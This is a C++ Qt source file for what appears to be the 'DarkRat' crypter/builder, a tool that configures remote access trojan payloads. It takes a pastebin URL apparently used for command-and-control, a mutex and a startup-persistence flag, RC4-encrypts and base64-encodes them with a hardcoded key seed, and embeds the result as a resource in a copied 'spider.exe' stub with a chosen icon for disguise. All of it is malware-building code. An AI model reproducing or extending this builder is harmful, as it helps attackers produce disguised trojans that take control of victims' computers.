#include "DarkRatCrypterUI.h"
#include <filesystem>
#include "rc4.h"
#include <QtWidgets\QMessageBox>
#include "RawBuilder.h"
#include "base64.h"
#include "BuildSystem/json.h"
std::string random_string(size_t length)
{
	auto randchar = []() -> char
	{
		const char charset[] =
			"0123456789"
			"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
			"abcdefghijklmnopqrstuvwxyz";
		const size_t max_index = (sizeof(charset) - 1);
		return charset[rand() % max_index];
	};
	std::string str(length, 0);
	std::generate_n(str.begin(), length, randchar);
	return str;
}

std::string key(size_t length, size_t seed)
{
	srand(seed);
	auto randchar = []() -> char
	{
		const char charset[] =
			"0123456789"
			"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
			"abcdefghijklmnopqrstuvwxyz";
		const size_t max_index = (sizeof(charset) - 1);
		return charset[rand() % max_index];
	};
	std::string str(length, 0);
	std::generate_n(str.begin(), length, randchar);
	return str;
}

DarkRatCrypterUI::DarkRatCrypterUI(QWidget *parent)
	: QMainWindow(parent)
{
	ui.setupUi(this);

	ui.mutex->setText(QString::fromStdString(random_string(5)));
	ui.encryptionkey->setText(QString::fromStdString(random_string(32)));
//	ui.output->setText("Output.exe");
	ui.statusBar->hide();
	QPixmap pix("icons/default.ico");
	int w = ui.icon->width();
	int h = ui.icon->height();
	ui.icon->setPixmap(pix.scaled(w, h, Qt::KeepAspectRatio));

}
char output[MAX_PATH];


void DarkRatCrypterUI::on_btn_icon_clicked()
{
	QFileDialog dialog(this);
	dialog.setNameFilter(tr("Icons (.ico)"));
	dialog.setViewMode(QFileDialog::Detail);
	QString fileName = QFileDialog::getOpenFileName(this,
		tr("Open Images"), "icons/", tr("Image Files ( *.ico )"));
	if (!fileName.isEmpty())
	{
		QImage image(fileName);
		int w = ui.icon->width();
		int h = ui.icon->height();
		ui.icon->setPixmap(QPixmap::fromImage(image).scaled(w, h, Qt::KeepAspectRatio));

	}

	ui.icon_path->setText(fileName);
}



void DarkRatCrypterUI::on_gen_mutex_clicked()
{
	ui.mutex->setText(QString::fromStdString(random_string(5)));
}

void DarkRatCrypterUI::on_btn_change_output_clicked()
{


	QString fileName = QFileDialog::getSaveFileName(this, tr("Save File"),
		"spider.exe",
		tr("PayLoadFiles (*.exe)"));

	ui.outputname->setText(fileName);



}

void DarkRatCrypterUI::on_gen_enckey_clicked()
{
	ui.encryptionkey->setText(QString::fromStdString(random_string(32)));
}


bool WriteToResources(LPCSTR szTargetPE, int id, LPBYTE lpBytes, DWORD dwSize)
{
	HANDLE hResource = NULL;
	hResource = BeginUpdateResourceA(szTargetPE, FALSE);
	bool update = UpdateResource(hResource, RT_RCDATA, MAKEINTRESOURCE(id), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPVOID)lpBytes, dwSize);
	if (!update) {
		return false;
	}
	EndUpdateResource(hResource, FALSE);
	return true;
}

QString base64_encode(QString string) {
	QByteArray ba;
	ba.append(string);
	return ba.toBase64();
}

std::string exec(const char* cmd) {
	char buffer[128];
	std::string result = "";
	FILE* pipe = _popen(cmd, "r");
	if (!pipe) throw std::runtime_error("popen() failed!");
	try {
		while (fgets(buffer, sizeof buffer, pipe) != NULL) {
			result += buffer;
		}
	}
	catch (...) {
		_pclose(pipe);
		throw;
	}
	_pclose(pipe);
	return result;
}


void DarkRatCrypterUI::on_build_clicked()
{
	RC4 rc4;
	std::string startup;
	if (ui.startup->isChecked()) {
		startup = "true";
	}
	else {
		startup = "false";
	}

	std::string foot = "\"";
	std::string pastebinURl = ui.pastebinurl->text().toStdString();
	std::string mutex = ui.mutex->text().toStdString();
	//std::string encryptionKey = ui.encryptionkey->text().toStdString();
	std::string encryptionKey = "KQC";



	nlohmann::json config = {
		{ "ek", "KQC"},
		{ "pu", pastebinURl},
		{ "mux", mutex},
		{ "sup", startup},
		{ "ri", 5},
		{ "pn", {"FOO", "BAR"}}
	};
	std::string write = config.dump();
	std::cout << write << std::endl;
	write = rc4.doRC4(write, key(32, 0x4d930cf57cfda1ba));
    write = config.dump();


	write = rc4.doRC4(write, key(32, 0x4d930cf57cfda1ba));
	write = darkRat::crypto::b64::encode(write.c_str());
	char* c_write = &write[0u];

	//output_file
	std::string szFilePath ="bin\\spider.exe";
	std::string szCopyPath = ui.outputname->text().toStdString();
	//std::string szCopyPath = "";
	QFile::copy(QString::fromStdString(szFilePath), QString::fromStdString(szCopyPath));
	//CopyFile((LPCWSTR)szFilePath.c_str(), (LPCWSTR)szCopyPath.c_str(), FALSE);
	bool buildSuccess = WriteToResources(szCopyPath.c_str(), 10, (BYTE*)c_write, strlen(c_write));


	std::string iconPath = "";
	if (ui.icon_path->text() == "defaulticon") {
		iconPath = "icons\\default.ico";
	}
	else {

		std::string s = ui.icon_path->text().toStdString();
		std::replace(s.begin(), s.end(), '/', '\\'); // replace all 'x' to 'y'

		iconPath = s;
	}
	//std::string command = " bin\\rcedit-x86.exe \""+ szCopyPath +"\" --set-icon \""+ iconPath +"\" ";
	//exec(command.c_str());


	if (buildSuccess) {
		QMessageBox msgBox1;
		msgBox1.setText(QString::fromStdString("Build Success "+ szCopyPath));
		msgBox1.exec();
	}else {
		QMessageBox msgBox2;
		msgBox2.setText(QString::fromStdString("Build Failed"));
		msgBox2.exec();
	}

	//MessageBox(NULL, TEXT("Open the message box1 "), , MB_OK | MB_SYSTEMMODAL);



	/*
	std::string json = " { \"ek\":  "+foot + encryptionKey + foot+"  , \"pu\":  "+ foot  + pastebinURl+ foot+"    , \"mux\": "+ foot+ mutex+ foot+" , \"sup\": "+foot + startup + foot+" , \"ri\": 5 , \"pn\": [\"FOO\",\"BAR\"]} ";

	QMessageBox msgBox1;
	msgBox1.setText(QString::fromStdString(json));
	msgBox1.exec();

	//json = rc4.doRC4(json, ui.encryptionkey->text().toStdString());
	json = rc4.doRC4(json, key(32, 0x4d930cf57cfda1ba));
	QString b64string = base64_encode(QString::fromStdString(json));
	std::string write = b64string.toStdString();


	
	char* c_write = &write[0u];
	QMessageBox msgBox;
	msgBox.setText(QString::fromStdString(write));
	msgBox.exec();
	WriteToResources("test.exe", 10, (BYTE*)c_write, strlen(c_write));
	//int status = RunPortableExecutable(rawData, buildString);

	*/
	//ui.statusBar->showMessage(QString::fromStdString() , 1000);
	
}
